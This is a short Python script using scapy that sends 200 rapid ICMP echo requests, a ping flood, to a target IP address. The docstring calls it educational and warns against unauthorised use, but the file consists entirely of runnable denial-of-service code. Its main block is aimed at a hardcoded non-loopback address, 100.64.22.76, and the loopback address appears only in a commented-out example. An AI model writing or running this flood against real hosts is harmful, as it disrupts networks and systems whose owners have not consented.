from scapy.all import IP, ICMP, send

def ping_flood(target_ip):
    """
    Sends a burst of ICMP Echo Request packets (ping flood) to the target IP address.

    This function is typically used for testing or educational purposes to demonstrate 
    how ICMP flooding works. It sends multiple ICMP packets in rapid succession, which 
    may overwhelm the target system's resources.

    Parameters:
    - target_ip (str): The IP address to flood with ICMP packets.

    Warning:
    This kind of operation can be considered malicious if used on unauthorized targets. 
    Only use this function in controlled or legal environments (e.g., local testing).
    """
    print("Ping flooding script started")

    # Construct an IP packet with ICMP Echo Request directed to the target IP
    packet = IP(dst=target_ip) / ICMP()

    # Send 200 ICMP packets with 0.01 second interval between each
    send(packet, count=200, inter=0.01, verbose=0)

if __name__ == "__main__":
    # Replace with a safe/test IP address when executing
    ping_flood("100.64.22.76")

# Example usage (only in a controlled or test environment):
# ping_flood("127.0.0.1")
